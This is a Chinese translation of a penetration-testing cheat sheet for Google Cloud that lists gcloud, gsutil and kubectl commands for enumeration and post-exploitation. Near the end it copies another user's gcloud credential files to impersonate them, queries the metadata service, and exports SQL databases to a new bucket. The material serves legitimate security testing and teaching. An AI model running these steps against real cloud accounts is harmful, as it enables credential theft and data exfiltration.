# Pentest 笔记:谷歌云版

> 原文：<https://infosecwriteups.com/pentest-notes-google-cloud-edition-2e138bb0f504?source=collection_archive---------4----------------------->

## 黑掉谷歌所需的一切

![](img/930e2c288faa9b15fa820fab12a199da.png)

unsplash.com

## 证明

使用 gcloud 认证

```
#user identity login
gcloud auth login#service account login
gcloud auth activate-service-account --key-file creds.json
```

列出 gcloud 可用的帐户

```
gcloud auth list
```

## 账户信息

获取帐户信息

```
gcloud config list
```

列出组织

```
gcloud organizations list
```

枚举组织范围内的 IAM 策略集

```
gcloud organizations get-iam-policy <org ID>
```

枚举每个项目设置的 IAM 策略

```
gcloud projects get-iam-policy <project ID>
```

列出项目

```
gcloud projects list
```

设置不同的项目

```
gcloud config set project <project name>
```

给出 project 中启用的所有 API 的列表

```
gcloud services list
```

获取可供用户使用的源代码仓库

```
gcloud source repos list
```

克隆存储到主目录

```
gcloud source repos clone <repo_name>
```

## 虚拟机

列出计算实例

```
gcloud compute instances list
```

获取对实例的外壳访问

```
gcloud beta compute ssh --zone "<region>" "<instance name>" --project "<project name>"
```

将公共 ssh 密钥放在项目的元数据服务上

```
gcloud compute ssh <local host>
```

如果在实例上，则获取访问范围

```
curl [http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes](http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes) -H &#39;Metadata-Flavor:Google’
```

使用谷歌密匙环解密加密数据

```
gcloud kms decrypt --ciphertext-file=encrypted-file.enc --plaintext-file=out.txt --key <crypto-key> --keyring <crypto-keyring> --location global
```

## 存储桶

列出谷歌存储桶

```
gsutil ls
```

递归列出谷歌存储桶

```
gsutil ls -r gs://<bucket name>
```

从存储桶复制项目

```
gsutil cp gs://bucketid/item ~/
```

## web 应用程序和 SQL

列出 web 应用程序

```
gcloud app instances list
```

列出 SQL 实例

```
gcloud sql instances list
gcloud spanner instances list
gcloud bigtable instances list
```

列出 SQL 数据库

```
gcloud sql databases list --instance <instance ID>
gcloud spanner databases list --instance <instance name>
```

导出 SQL 数据库和存储桶

首先将存储桶复制到本地目录

```
gsutil cp gs://bucket-name/folder/ .
```

创建新的存储桶，更改 perms，导出 SQL DB

```
gsutil mb gs://<googlestoragename>
gsutil acl ch -u <service account> gs://<googlestoragename>
gcloud sql export sql <sql instance name> gs://<googlestoragename>/sqldump.gz --database=<database name>
```

## 建立工作关系网

列出网络

```
gcloud compute networks list
```

列出子网

```
gcloud compute networks subnets list
```

列出 VPN 隧道

```
gcloud compute vpn-tunnels list
```

列出互连(VPN)

```
gcloud compute interconnects list
```

## 容器

```
gcloud container clusters list
```

GCP Kubernetes 配置文件~/。kube/config 在您通过 gcloud 认证后生成，并运行:

```
gcloud container clusters get-credentials <cluster name> --region <region>
```

如果成功并且用户拥有正确的权限，可以使用下面的 Kubernetes 命令来获取集群信息:

```
kubectl cluster-info
```

## 无服务器

GCP 函数日志分析—可以从与 GCP 函数相关的日志中获得有用的信息

```
gcloud functions list
gcloud functions describe <function name>
gcloud functions logs read <function name> --limit <number of lines>
```

GCP 云运行分析—可以从描述中获得有用的信息，如环境变量。

```
gcloud run services list
gcloud run services describe <service-name>
gcloud run revisions describe --region=<region> <revision-name>
```

Gcloud 将凭证储存在~/中。config/gcloud/credentials.db 搜索主目录

```
sudo find /home -name "credentials.db
```

将 gcloud 目录复制到您自己的主目录，以被入侵用户的身份进行身份验证

```
sudo cp -r /home/username/.config/gcloud ~/.config
sudo chown -R currentuser:currentuser ~/.config/gcloud
gcloud auth list
```

# 元数据服务 URL

```
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"
```